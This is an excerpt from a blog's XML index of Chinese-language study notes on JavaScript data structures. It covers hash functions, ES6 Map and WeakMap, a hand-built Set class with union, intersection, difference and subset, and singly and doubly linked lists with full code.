key.charCodeAt(i); &#125; return hash % 1013;&#125; 它包括初始化一个 hash 变量并赋值一个质数，然后迭代参数 key ，将 hash 与参数33相乘 ，并和当前迭代到的字符的 ASCII码值相加。 最后，我们将使用相加的和于另一个随机质数相除的余数。 这并不是最好的散列函数，但是是社区最被推崇的散列函数之一。 ES6——Map类ES6中有Map,我们可以基于这个类来开发Dictionary 类 12345678910111213141516171819const map = new Map();map.set('Gandalf','Gandalf@qq.com');map.set('John','John@qq.com');map.set('Tyrion','Tyrion@qq.com');map.set('Aaron','Aaron@qq.com');map.set('Donnie','Donnie@qq.com');map.set('Ana','Ana@qq.com');map.set('Jonathan','Jonathan@qq.com');map.set('Jamie','Jamie@qq.com');map.set('Sue','Sue@qq.com');map.set('Mindy','Mindy@qq.com');map.set('Paul','Paul@qq.com');map.set('Nathan','Nathan@qq.com');console.log(map.has('Gandalf')); //true console.log(map.size); // 12console.log(map.keys()); // MapIteratorconsole.log(map.values()); // MapIteratorconsole.log(map.get('Gandalf')); // Gandalf@qq.com 可以看到，values 和 keys 方法返回都是 MapIterator，而不是值或键构成的数组。另一个区别是，size 是属性。 删除 map 中的元素可以用 delete 方法 1map.delete('Gandalf'); clear 方法会重置 map 数据结构，这跟我们在之前的实现时一样的。 ES6——WeakMap 类 和 WeakSet 类除了 Set 和 Map 两种新的数据结构，ES6还增加了它们的弱化版本，WeakMap 和 WeakSet 类。 基本上，Map 和 Set 与其弱化版本之间仅有的区别是 WeakMap 和 WeakSet 类没有 entries、keys、values 等方法。 只能用对象作为键 创建和使用这两个类主要是为了性能。没有强引用的键，这使得JavaScript 的垃圾回收器可以从中清除整个入口。 另外的一个优点是，必须用键才可以取出值。这些类没有 entries 、keys、values 等迭代器方法，因此，除非你知道键，否则没有办法取出值。 小结本章，我们学习了字典的相关知识，了解了如何添加、移除和获取元素已经其他的一些方法，我们还了解了字典和集合的不同之处。 学习了散列运算，知道该怎么去创建一个散列表数据结构，如何创建一个散列函数。 下一章，我们将学习一种新的数据结构——树。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第六章）—— 集合]]></title>
    <url>%2F2018-11-01-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part6.html</url>
    <content type="text"><![CDATA[前面已经学习了数组（列表）、栈、队列和链表等顺序数据结构。这一章，我们要学习集合，这是一种不允许值重复的顺序数据结构。 本章可以学习到，如何添加和移除值，如何搜索值是否存在，也可以学习如何进行并集、交集、差集等数学操作，还可以学到如何使用ES6 原生的 Set类 第六章 集合构建数据集合集合是由一组无序且唯一（即不重复）的项组成的。这个数据结构使用了与有限集合相同的属性概念，但应用在计算机科学的数据结构中。 在数学中，集合时一组不同的对象（的集）。 比如说，一个由大于或等于0 的整数组成的自然数集合： N：{0,1,2,3,4,5,6，...}。在集合中的对象列表用 {}（大括号）包围 还有一个概念叫做空集。空集就是不包含任何元素的集合。 可以把集合想象成一个既没有重复元素，也没有顺序概念的数组。 在数学中，集合也有并集、交集、差集等基本操作。 创建集合下面Set类的骨架 123function Set()&#123; let items = &#123;&#125;;&#125; 我们使用对象而不是数组来表示集合（items）,但也可以用数组实现。这里我们用对象来实现，同时，JavaScript 对象不允许一个键指向两个不同的属性，也保证了集合里的元素都是唯一的。 接下来，需要声明一些结合可用的方法 add(value)：向集合添加一个新的项 remove(value)：从集合移除一个值 has(value)：如果值在集合中，返回 true,否则返回 false clear()：移除集合中的所有项 size()：返回集合所包含元素的值，与数组的 length 属性类似 values()：返回一个包含集合中所有值的数组 has(value)方法首先要实现的就是 has(value)方法，这是因为它会被 add、remove 等方法调用。 123this.has = function(value)&#123; return value in items;&#125; 既然我们使用对象来存储集合的值，就可以使用 JavaScript 的 in 操作符来验证给定的值是否是 items 对象的属性。 但这个方法还有一个更好的实现方式 123this.has = function(value)&#123; return items.hasOwnProperty(value);&#125; 所有的 JavaScript 对象都有 hasOwnProperty方法，这个方法返回一个表明对象是否具有特定属性的布尔值。 in 和 hasOwnProperty 的区别 in判断的是对象的所有属性，包括对象实例及其原型的属性。而hasOwnProperty则是判断对象实例的是否具有某个属性。 这也是为什么 for in 循环的时候会建议使用 hasOwnProperty进行过滤，在使用了 eslint 才不会报警告,同时也是为了可以有效避免扩展本地原型而引起的错误。 1234for (var i in foo) &#123; if (foo.hasOwnProperty(i)) &#123; console.log(i); &#125; add 方法1234567this.add = function(value)&#123; if(!this.has(value))&#123; items[value] = value return true &#125; return false;&#125; 对于给定的 value，可以检测是否存在于集合中。如果不存在，就把 value 添加到结合中，返回 true,表示添加了这个值。如果集合中，已经有了，就返回 false,表示没有添加它。 remove 和 clear 方法remove 方法 1234567this.remove = function(value)&#123; if(this.has(value))&#123; delete items[value]; return true; &#125; return false;&#125; 因为使用对象来存储集合的 items 对象，可以简单使用 delete 操作符从 items 对象中移除属性 clear 方法 123this.clear = function()&#123; items = &#123;&#125;;&#125; 重置 items 对象，需要做的只是把一个空对象重新赋值给它，我们也可以迭代集合，用 remove 方法依次移除所有的值，但既然有更简单的方法，那样做就太麻烦了。 size 方法返回集合中有多少项，有三种实现方法 第一种是像之前一样，使用 length 变量，每当移除或者添加的时候控制它。 第二种是使用 JavsScript 内建的 Object 类的一个内建函数 123this.size = function()&#123; return Object.keys(items).length&#125; JavaScript 的 Object 类有一个 keys 方法，它返回一个包含给定对象所有属性的数组。在这种情况下，可以使用这个数组的 length 属性来返回 items 对象的属性个数。 第三种方法是手动提取 items 对象的每一个属性，记录属性的个数并返回这个数字。 123456789this.size = function()&#123; let count = 0; for(let key in items)&#123; if(items.hasOwnProperty(key))&#123; ++count; &#125; &#125; return count;&#125; 遍历 items 对象的所有属性，检查它们是否是对象自身的属性（避免重复计数），如果是，就递增 count 变量的值，最后在方法结束时返回这个数字。 values 方法values 方法也应用了相同的逻辑，提取 items 对象的所有属性，以数组的形式返回 1234567this.values = function()&#123; let values = []; for(let i=0 , keys=Object.keys(items); i&lt;keys.length; i++)&#123; values.push(items[keys[i]]); &#125; return values;&#125; 还有兼容旧浏览器的写法 123456789this.values = function()&#123; let values = []; for(let key in items)&#123; if(items.hasOwnProperty(key))&#123; values.push(items[key]) &#125; &#125; return values;&#125; Set类全部代码1234567891011121314151617181920212223242526272829303132333435363738394041function Set()&#123; let items = &#123;&#125;; this.has = function(value)&#123; return items.hasOwnProperty(value); &#125; this.add = function(value)&#123; if(!this.has(value))&#123; items[value] = value return true &#125; return false; &#125; this.remove = function(value)&#123; if(this.has(value))&#123; delete items[value]; return true; &#125; return false; &#125; this.clear = function()&#123; items = &#123;&#125;; &#125; this.size = function()&#123; let count = 0; console.log(items); for(let key in items)&#123; if(items.hasOwnProperty(key))&#123; ++count; &#125; &#125; return count; &#125; this.values = function()&#123; let values = []; for(let i=0 , keys=Object.keys(items); i&lt;keys.length; i++)&#123; values.push(items[keys[i]]); &#125; return values; &#125;&#125; 使用 Set类现在数据结构已经完成了 。测试一下 123456789101112131415let set = new Set(); // 新建 Set类 实例set.add(1); set.add(2);set.add(3);set.add('j');console.log(set.has(2)); // trueconsole.log(set.size()); // 4console.log(set.value()); // [1, 2, 3, "j"]set.remove(2);console.log(set.has(2)); // false console.log(set.size()); // 3console.log(set.value()); // [1, 3, "j"]set.clear();console.log(set.size()); // 0console.log(set.value()); // [] 集合操作对集合可以进行以下操作 并集：对于给定的两个集合，返回一个包含两个集合中所有元素的新集合 交集：对于给定的两个集合，返回一个包含两个集合中共有元素的新集合 差集：对于给定的两个集合，返回一个所有存在于第一个集合且不存在于第二个集合的元素的新集合 字集：验证一个给定的集合是否是另一个的子集。 并集12345678910111213// 并集this.union = function(otherSet)&#123; let unionSet = new Set(); let values = this.values(); for(let i = 0; i &lt; values.length; i++)&#123; unionSet.add(values[i]); &#125; values = otherSet.values(); for(let i = 0; i &lt; values.length; i++)&#123; unionSet.add(values[i]); &#125; return unionSet;&#125; 首先需要创建一个新的集合，代表两个集合的并集，获取第一个集合（当前Set类实例）所有值（values），遍历并添加到代表并集的集合中。然后对第二个集合做同样的事情，最后返回结果。 测试上面的代码 12345678910111213let setA = new Set();setA.add(1); setA.add(2); setA.add(3); let setB = new Set();setB.add(3);setB.add(4);setB.add(5);setB.add(6);console.log(setA.values()); // [1, 2, 3]console.log(setB.values()); // [3, 4, 5, 6]let unionAB = setA.union(setB);console.log(unionAB.values()); // [1, 2, 3, 4, 5, 6] 可以注意到元素 3同时存在于A和B中，但是集合里只输出了一次 交集1234567891011// 交集this.intersection = function(otherSet)&#123; let intersectionSet = new Set(); let values = this.values(); for(let i = 0;i &lt;values.length; i++)&#123; if(otherSet.has(values[i]))&#123; intersectionSet.add(values[i]); &#125; &#125; return intersectionSet;&#125; 验证 12let intersectionSetAB = setA.intersection(setB);console.log(intersectionSetAB.values()); // [3] 差集1234567891011// 差集this.difference = function(otherSet)&#123; let differenceSet = new Set(); let values = this.values(); for(let i = 0; i &lt; values.length; i++)&#123; if(!otherSet.has(values[i]))&#123; differenceSet.add(values[i]); &#125; &#125; return differenceSet;&#125; 验证 12let differenceSetAB = setA.difference(setB);console.log(differenceSetAB.values()); // [1, 2] differenceSetAB 会得到所有存在于集合A 但不存在与集合B的值。 子集1234567891011121314// 子集this.subset = function(otherSet)&#123; if(this.size() &gt; otherSet.size())&#123; return false &#125;else&#123; let values = this.values(); for(let i = 0; i &lt; values.length; i++)&#123; if(!otherSet.has(values[i]))&#123; return false; &#125; &#125; return true; &#125;&#125; 首要要验证当前Set实例的大小，如果当前实例中的元素比 otherSet 实例更多，它就不是一个子集。子集的元素个数需要小于或等于要比较的集合。 接下来遍历所有集合中的元素，验证这些元素也存在于 otherSet 中，如果有任何元素不存在与 otherSet 中的，这意味着它不是一个子集，返回 false。如果所有元素都存在于 otherSet 中，就返回 true。 验证 1234567let subSetAB = setA.subset(setB);console.log(subSetAB); // false setB.add(1); setB.add(2); setB.add(3); console.log(subSetAB); // true ES6——Set类ES6新增了 Set 类，我们可以基于 ES6 的 Set 开发我们的 Set 类 12345let set = new Set();set.add(1);console.log(set.values()); // SetIterator &#123;1&#125;console.log(set.has(1)); // trueconsole.log(set.size); // 1 ES6的values 方法会返回 Iterator，而不是值构成的数组，需要通过 next() 方法来遍历获取值，另外size 是一个属性不是一个方法。 可以用 delete 方法删除 set 中的元素 1set.delete(1); // true clear 方法会重置 set 数据结构，跟我们实现的功能一样。 ES6 Set类的操作我们的Set类实现了交集、差集、并集、子集等数学操作，然后ES6 原生的Set 并没有这些功能，不过我们可以尝试模拟。 例子 12345678let setA = new Set();setA.add(1);setA.add(2);setA.add(3);let setB = new Set();setB.add(2);setB.add(3);setB.add(4); 模拟并集操作模拟交集操作需要创建一个辅助函数，来生成包含 setA 和 setB 都有的元素的新集合。 12345let unionAB = new Set();for(let x of setA) unionAB.add(x);for(let x of setB) unionAB.add(x);console.log(unionAB); // Set(4) &#123;1, 2, 3, 4&#125; 模拟交集操作1234567891011let intersection = function(SetA,SetB)&#123; let intersectionSet = new Set(); for(let x of SetA)&#123; if(SetB.has(x))&#123; intersectionSet.add(x); &#125; &#125; return intersectionSet;&#125;let intersectionSetAB = intersection(setA,setB);console.log(intersectionSetAB); // Set(2) &#123;2, 3&#125; 也可以用简单的语法实现 1let intersectionSetAB = new Set([x for (x of setA) if (setB.has(x))]) 但是简化的函数，目前只有在火狐才可以运行。 模拟差集操作1234567891011let difference = function(SetA,SetB)&#123; let differenceSet = new Set(); for(let x of SetA)&#123; if(!SetB.has(x))&#123; differenceSet.add(x); &#125; &#125; return differenceSet;&#125;let differenceSetAB = difference(setA,setB);console.log(differenceSetAB); // Set(1) &#123;1&#125; 小结学习了从头实现一个ES6中定义的类似的Set 类，还实现了一些再其他语言的集合数据结构中不常见的一些方法，例如并集、交集、差集和子集。 后面，将会介绍散列和字典这两种非顺序数据结构。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为什么我要放弃javaScript数据结构与算法（第五章）—— 链表]]></title>
    <url>%2F2018-10-30-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part5.html</url>
    <content type="text"><![CDATA[距离第四章的完成已经过去了两个月了，这段期间，由于学习 nodeJS、《图解http》以及项目，暂时把这本书丢下了。今天项目已经完成了七七八八，其他几本书也看完了，趁着有时间，来继续学习这本书的第五章——链表。 这一章你将会学会如何实现和使用链表这种动态的数据结构，这意味着我们可以从中任意添加或移除项，它会按需进行扩张。 本章内容 链表数据结构 向链表添加元素 从链表移除元素 使用 LinkedList 类 双向链表 循环链表 第五章 链表链表数据结构要存储多个元素，数组（或列表）可能是最常见的数据结构了。然后这种数据结构有一个缺点：数组的大小是固定的，从数组的起点或中间插入或移除项的成本有点高，因为需要移动元素。 链表存储有序的元素集合，但不同于数组，链表中的元素在内存并不是连续放置的。每个元素由一个存储元素本身的节点和一个指向下一个元素的引用（也称指针或链接）组成，下图展示了一个链表的结构。 相对于传统的数组，链表的一个好处在于，添加或者移除元素的时候不需要移动其他元素，然后，链表需要使用指针，因为实现链表时需要额外注意。数组的另一个细节是可以直接访问任何位置的任何元素，而想要访问链表中间的一个元素，需要从起点（表头）开始迭代列表直到找到所需的元素。 现实中也有一些链表的例子，第一个例子就是康加舞队，每个人就是一个元素，手就是链向下一个人的指针，可以向队列汇总增加人——只需要找到想加入的点，断开连接，插入一个人，再重新连接起来。 另外一个例子就是寻宝游戏，你有一条线索，这条线索是指向寻找下一个线索的地点的指针，你顺着这条链去下一个地点，得到另一条指向再下一处的线索。得到列表中间的线索的唯一方法，就是从起点（第一个线索）顺着列表寻找。 还有一个可能就是用来说明链表中的最流行的例子，那就是火车。一列火车是由一系列车厢（也称车皮）组成的。每节车厢或车皮都互相连接。可以很容易的分离开一节车皮，改变它的位置，添加或移除它。 创建链表了解链表是什么之后，就要开始实现我们的数据结构了，一下是我们的 LinkedList 类的骨架： 123456789101112131415161718192021function LinkedList()&#123; let Node = function(element)&#123; // 需要一个Node辅助类，表示要加入列表的项，element 代表要添加到列表中的值， next d代表指向列表的下一个节点向的指针 this.element = element; this.next = null; &#125; let length = 0; // 存储列表项的数量 length 属性 let head = null; // 存储第一个节点的引用在 head 变量 this.append = function(element)&#123;&#125;; this.insert = function(position,element)&#123;&#125; this.removeAt = function(position)&#123;&#125; this.remove = function(element)&#123;&#125; this.indexOf = function(position)&#123;&#125; this.isEmpty = function()&#123;&#125; this.size = function()&#123;&#125; this.getHead = function()&#123;&#125; this.toString = function()&#123;&#125; this.print = function()&#123;&#125;&#125; LinkedList 类的方法的功能 append(element)：向列表尾部添加一个新的项 insert(position,element)：向列表的特定位置插入一个新的项 removeAt(position)：从列表的特定位置移除一项 remove(element)：从列表中移除一项 indexOf(element)：返回元素在列表中的索引。如果列表中没有该元素则返回-1 isEmpty()：如果链表中不包含任何元素，返回true,如果链表的长度大于0则返回 false size()：返回链表包含的元素个数，与数字的 length 属性类似 toString()：由于列表项使用 Node 类，就需要重写继承自 JavaScript 对象默认的 toString 方法，让其只输出元素的值。 向链表尾部追加元素向 LinkedList 对象尾部添加一个元素时，可能有两种场景，列表为空，添加的是第一个元素，或者列表不为空，向追加元素。 123456789101112131415this.append = function(element)&#123; let node = new Node(element),current; if(head === null)&#123; head = node; &#125;else&#123; current = head; // 循环列表，直到找到最后一项 while(current.next)&#123; current = current.next; &#125; // 当current.next元素为null时，找到最后一项，将其 next 赋为 node,建立连接 current.next = node; &#125; length++; // 更新列表的长度&#125;; 可以在 append 函数 加上return node ,通过下面的代码来使用和测试目前创建的数据结构 123let list = new LinkedList();console.log(list.append(15)); // Node &#123;element: 15, next: null&#125;console.log(list.append(10)); // Node &#123;element: 10, next: null&#125; 从链表中移除元素移除元素也有两种场景：第一种是移除第一个元素，第二种是移除第一个以外的任一元素。我们要实现两种 remove 方法：第一种是从特定位置移除第一个元素，第二种是根据元素的值移除元素。 首先先实现移除特定位置的元素 123456789101112131415161718192021222324this.removeAt = function(position)&#123; // 检查越界值 if(position &gt;-1 &amp;&amp; position &lt; length)&#123; let current = head,previous,index = 0; // 移除第一项 if(position === 0)&#123; head = current.next; console.log(current.element); &#125;else&#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; // 将 previous 与 current 的下一项连接起来，跳过 current,从移除它 previous.next = current.next; &#125; length --; console.log(current.element); return current.element; &#125;else&#123; return null; &#125; &#125; 如果想要移除第一个元素（position=0），要做的就是让 head 指向列表的第二个元素，我们用 current 变量穿甲一个对列表中第一个元素的应用，这样 current 变量就是对列表中第一个元素的引用，如果吧 head 赋值为 current.next 就会移除第一个元素。 如果我们要移除列表的最后一项或者是中间的一项，为此，需要依靠一个细节来迭代列表，知道到达目标位置（index++ &lt; position），使用一个用于内部控制和递增的 index 变量，current 变量总是对所循环列表的当前元素的引用（current = current.next），我们还需要一个对当前元素的前一个元素的引用（previous = current），它被命名为 previous。 因此，要从列表中移除当前元素，要做的就是将 previous.next 和 current.next 链接起来，这样当前元素就会被丢弃在计算机内存中，等着被垃圾回收站清除。 对于最后一个元素，在（while(index++ &lt; position)）跳出循环时， current 变量总是对列表中最后一个元素的引用（要移除的元素）。current.next 的值将是 null（因为它是最后一个元素）。由于还保留了对 previous 的引用（当前元素的前一个元素），previous 就指向了 current 。那么要移除 current,要做的就是把 previous.next 的值改变为 current.next 。 在任意位置插入元素实现 insert 方法，使用这个方法可以在任意位置插入一个元素。 123456789101112131415161718192021222324this.insert = function(position,element)&#123; // 检查越界值 if(position &gt;=0 &amp;&amp; position &lt;= length)&#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0 )&#123; // 在第一个位置添加 node.next = current; head = node; &#125;else&#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; &#125; length++; return true; &#125;else&#123; return false; &#125;&#125; current 变量是对列表中第一个元素的引用，我们需要做的是把 node.next 的值设为 current （列表中的第一个元素），现在 head 和 node.next 都指向了 current ，接下来要做的就是把 head 的引用改为 node ，这样列表中就有了一个新元素。 现在来处理第二种场景，在列表中间或者末尾添加一个新的元素。首先，循环访问列表，找打目标为位置，当跳出循环的时候， current 变量将是对想要插入新元素的位置之后一个元素的引用，而 previous 将是对想要插入新元素的位置之前的一个元素的引用。在这种情况下，我门要在 previous 和 current 之间添加新项。因此，需要将新项（node）和当前链接起来（node.next = current），然后需要改变 previous 和 current z之间的链接，我们还需要让 previous.next 指向 node。 实现其他方法toString方法 123456789this.toString = function()&#123; let current = head, string = ''; while(current)&#123; string += current.element + (current.next ? '-':''); current = current.next; &#125; return string;&#125; 赋值current为 head, 循环访问 current，将 current 变量当做索引，初始化用于拼接元素的变量（string）。通过 current 来检查元素是否存在，如果列表为空或是到达列表中最后一个元素的下一位（null），while 循环中的代码就不会执行，就可以得到元素的内容，将其拼接到字符串中，最后，迭代下一个元素。最后，返回列表内容的字符串。 indexOf方法 indexOf方法接受一个元素的值，如果在列表中找到它，就返回元素的位置，否则返回 -1 123456789101112this.indexOf = function(element)&#123; let current = head, index = 0; while(current)&#123; if(element === current.element)&#123; return index; &#125; index++; current = current.next; &#125; return -1;&#125; 循环变量 current，它的初始值是 head ,利用index 来计算位置数。访问元素，检查当前元素是否是我们要找的，如果是，就返回它的位置，不是就继续计数，检查列表中的下一个节点。 如果列表为空，或是到达列表的尾部（current = current.next 将是 null），循环就不会执行。如果没有找到值就返回 -1 。 实现了上面的方法，就可以实现remove等其他方法了 remove方法 1234this.remove = function(element)&#123; let index = this.indexOf(element); return this.removeAt(index);&#125; isEmpty、size 和 getHead方法 isEmpty和size 和之前章节实现一模一样 1234567this.isEmpty = function()&#123; return length === 0;&#125;this.size = function()&#123; return length;&#125; 还有 getHead方法 123this.getHead = function()&#123; return head;&#125; head 变量是 LinkedList 类的私有变量，我们如果需要在类的实现外部循环访问列表，就需要提供一种获取类的第一个元素的方法。 整个 LinkedList函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115function LinkedList()&#123; let Node = function(element)&#123; // 需要一个Node辅助类，表示要加入列表的项，element 代表要添加到列表中的值， next d代表指向列表的下一个节点向的指针 this.element = element; this.next = null; &#125; let length = 0; // 存储列表项的数量 length 属性 let head = null; // 存储第一个节点的引用在 head 变量 this.append = function(element)&#123; let node = new Node(element),current; if(head === null)&#123; head = node; &#125;else&#123; current = head; // 循环列表，直到找到最后一项 while(current.next)&#123; current = current.next; &#125; // 当current.next元素为null时，找到最后一项，将其 next 赋为 node,建立连接 current.next = node; &#125; length++; // 更新列表的长度 &#125;; this.insert = function(position,element)&#123; // 检查越界值 if(position &gt;=0 &amp;&amp; position &lt;= length)&#123; let node = new Node(element), current = head, previous, index = 0; if(position === 0 )&#123; // 在第一个位置添加 node.next = current; head = node; &#125;else&#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; &#125; length++; return true; &#125;else&#123; return false; &#125; &#125; this.removeAt = function(position)&#123; // 检查越界值 if(position &gt;-1 &amp;&amp; position &lt; length)&#123; let current = head,previous,index = 0; // 移除第一项 if(position === 0)&#123; head = current.next; console.log(current.element); &#125;else&#123; while(index++ &lt; position)&#123; previous = current; current = current.next; &#125; // 将 previous 与 current 的下一项连接起来，跳过 current,从移除它 previous.next = current.next; &#125; length --; return current.element; &#125;else&#123; return null; &#125; &#125; this.remove = function(element)&#123; let index = this.indexOf(element); return this.removeAt(index); &#125; this.indexOf = function(element)&#123; let current = head, index = 0; while(current)&#123; if(element === current.element)&#123; return index; &#125; index++; current = current.next; &#125; return -1; &#125; this.isEmpty = function()&#123; return length === 0; &#125; this.size = function()&#123; return length; &#125; this.getHead = function()&#123; return head; &#125; this.toString = function()&#123; let current = head, string = ''; while(current)&#123; string += current.element + (current.next ? '-':''); current = current.next; &#125; return string; &#125;&#125; 双向链表链表有多种不同的类型，这一节介绍 双向链表，双向链表和普通链表的区别在于，在链表中，一个节点只有链向下一个链接，而在双向链表中，链接是双向的：一个链向下一个元素，另一个链向前一个元素。如下图所示 先从实现 DoublyLinkedList 类所需要的变动开始 123456789101112function DoublyLinkedList()&#123; let Node = function(elememt)&#123; this.elememt = elememt; this.next = null; this.prev = null; // 新增的 &#125; let length = 0; let head = null; let tail = null // 新增的 // 这里是方法&#125; 可以看出，Node 类中新增了 prev属性（一个新指针），在 DoublyLinkedList 类里也有用来保存对列表最后一项的引用的 tail 属性。 双向链表提供了两种迭代列表的方式：从头到尾，或者从尾到头。我们也可以方位一个特定节点的下一个或者是上一个元素。在单向链表中，如果迭代列表时错过了要找的元素，就需要回到列表起点，重新迭代。这是双向链表的一个优点。 在任意位置插入新元素向双向链表中插入一个新项跟（单向）链表非常相类似。区别在于，链表只要控制一个 next 指针，而双向链表则要同时控制 next 和 prev （previous，前一个）这两个指针。 1234567891011121314151617181920212223242526272829303132333435363738this.insert = function(position,elememt)&#123; // 检查越界值 if(position &gt;= 0 &amp;&amp; position &lt;= length)&#123; let node = new Node(elememt), current = head, previous, index = 0; if(position === 0)&#123; // 在第一个位置添加 if(!head)&#123; head = node; tail = node; &#125;else&#123; node.next = current; current.prev = node; head = node; &#125; &#125;else if(position === length)&#123; // 最后一项 current = tail; current.next = node; node.prev = current; tail = node; &#125;else&#123; while (index++ &lt; position) &#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; current.prev = node; node.prev = previous; &#125; length++ return true; &#125;else&#123; return false; &#125;&#125; 在列表的第一个位置（列表的起点）插入一个新元素，如果列表为空（if(!head)），那只需将 head 和 tail 都指向这个新节点。如果不为空， current 变量将是对列表中的第一个元素的引用。就像我们在链表中所做的，把 node.next 设为 current ，而head 将指针指向 node （它被设为列表中的第一个元素）。不同之处，我们还需要为指向上一个元素的指针设一个值。current.prev 指针将由 指向 null 变成指向 新元素（current.prev = node）。node.prev 指针已经是 null,因此不需要在更新任何东西了。 假如我们要在列表最后添加一个新元素。这是一个特殊情况，因为我们还控制着指向最后一个元素的指针（tail）。current 变量将引用最后一个元素（current = tail）。然后分开建立第一个链接：node.prev 将引用current。current.next 指针（指向null）将指向 node （由于构造函数，node.next 已经指向了 null）。然后只剩下一件事，就是更新 tail ，它将由 指向 current 变成指向 node 。 第三种场景：在列表中插入一个新元素，就像我们在之前方法中所做，迭代列表，知道到达要找的位置（while (index++ &lt; position)）。我们将在 current 和 previous 元素之间插入新元素。首先，node.next 将指向 current ,而 previous.next 将指向 node,这样就不会跌势节点之间的链接。然后需要处理所有的链接：current.prev 将指向node ,而 node.prev 将指向 previous 从任意位置移除元素从双向链表中移除元素跟链表非常类似。唯一区别就是还需要设置一个位置的指针。 12345678910111213141516171819202122232425262728293031323334this.removeAt = function(position)&#123; // 检查越界值 if(position &gt; -1 &amp;&amp; position &lt; length)&#123; let current = head, previous, index = 0; // 移除第一项 if(position === 0)&#123; head = current.next; // 如果只有一项，更新 tail if(length === 1)&#123; tail = null; &#125;else&#123; head.prev = null; &#125; &#125;else if(position === length-1)&#123; // 最后一项 current = tail; tail = current.prev; tail.next = null; &#125;else&#123; while (index++ &lt; position) &#123; previous = current; current = current.next; &#125; // 将 previous 与 current 的下一项连接起来——跳过 current previous.next = current.next; current.next.prev = previous; &#125; length --; return current.elememt; &#125;else&#123; return null; &#125;&#125; 我们需要处理三种场景，从头部、从中间和从尾部移除一个元素。 移除第一个元素。current 变量是对列表中第一个元素的引用，也就是我们想要移除的远古三。需要做的就是改变 head 的引用，将其从 current 改为下一个元素（head = current.next;），但是我们还需要更新 current.next 指向上一个元素的指针（因为第一个元素的 prev 指针是 null）。因此，把 head.prev 的引用改为 null（因为 head 也指向了列表中的第一个元素，或者也可以用 current.next.prev ）。由于还需要控制 tail 的引用，我们可以检测要移除的是否是第一个元素，如果是，只需要把 tail 也设为 null。 移除最后一个位置的元素。既然已经有了对最后一个元素的引用（tail）,我们就不需要为找到它而迭代列表。我们可以把 tail 的引用赋给 current 变量。接下来，就需要吧 tail 的引用更新为列表中的倒数第二个元素（current.prev,或者 tail.prev也可以）。既然 tail 指向了倒数第二个元素，我们需要把 next 指针更新为 null （tail.next = null）。 最后一种场景，从列表中移除一个元素。首先需要迭代列表，直到到达要找的位置。current 变量所引用的就是要移除的远古三。那么要移除它，我们可以通过更新 previous.next 和 current.next.prev 的引用，在列表中跳过它。因此，previous.next 将 指向 current.next ，而 current.next.prev 将指向 previous。 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141function DoublyLinkedList()&#123; let Node = function(elememt)&#123; this.elememt = elememt; this.next = null; this.prev = null; // 新增的 &#125; let length = 0; let head = null; let tail = null // 新增的 this.append = function(elememt)&#123; let node = new Node(elememt), current; if(!head)&#123; head = node; tail = node; &#125;else&#123; current = tail; current.next = node; node.prev = current; tail = node; &#125; length++; &#125; this.insert = function(position,elememt)&#123; // 检查越界值 if(position &gt;= 0 &amp;&amp; position &lt;= length)&#123; let node = new Node(elememt), current = head, previous, index = 0; if(position === 0)&#123; // 在第一个位置添加 if(!head)&#123; head = node; tail = node; &#125;else&#123; node.next = current; current.prev = node; head = node; &#125; &#125;else if(position === length)&#123; // 最后一项 current = tail; current.next = node; node.prev = current; tail = node; &#125;else&#123; while (index++ &lt; position) &#123; previous = current; current = current.next; &#125; node.next = current; previous.next = node; current.prev = node; node.prev = previous; &#125; length++ return true; &#125;else&#123; return false; &#125; &#125; this.removeAt = function(position)&#123; // 检查越界值 if(position &gt; -1 &amp;&amp; position &lt; length)&#123; let current = head, previous, index = 0; // 移除第一项 if(position === 0)&#123; head = current.next; // 如果只有一项，更新 tail if(length === 1)&#123; tail = null; &#125;else&#123; head.prev = null; &#125; &#125;else if(position === length-1)&#123; // 最后一项 current = tail; tail = current.prev; tail.next = null; &#125;else&#123; while (index++ &lt; position) &#123; previous = current; current = current.next; &#125; // 将 previous 与 current 的下一项连接起来——跳过 current previous.next = current.next; current.next.prev = previous; &#125; length --; return current.elememt; &#125;else&#123; return null; &#125; &#125; this.remove = function(elememt)&#123; let index = this.indexOf(elememt); this.removeAt(index); &#125; this.toString = function()&#123; let current = head, str = ''; while (current) &#123; str += current.elememt + (current.next?'-':''); current = current.next; &#125; return str; &#125; this.indexOf = function(elememt)&#123; let current = head, index = 0; while (current) &#123; if(current.elememt === elememt)&#123; return index &#125; current = current.next; index++ &#125; return -1; &#125; this.isEmpty = function()&#123; return length === 0; &#125; this.size = function()&#123; return length; &#125; this.getHead = function()&#123; return head; &#125;&#125; 循环链表循环链表可以像链表一样只有单向引用，也可以像双向链表一样有双向引用。循环链表和链表之间唯一的区别在于，最后一个元素指向下一个元素的指针（tail.next）不是引用 null,而是指向第一个元素（head），如下图所示 双向链表有指向 head 元素的 tail.next ，和指向 tail 元素的 head.prev 小结这一章中，学习了链表这种数据结构，及其辩题双向链表和循环链表，知道了如何在任意位置添加和移除元素，已经如何循环访问两边，比数组重要的优点就是，无需移动链表中的元素，就能轻松添加和移除元素。当你需要添加和移除很多元素的时候，最好的选择就是链表，而非数组。下一章将学习集合，最后一种顺序数据结构。 书籍链接： 学习JavaScript数据结构与算法]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
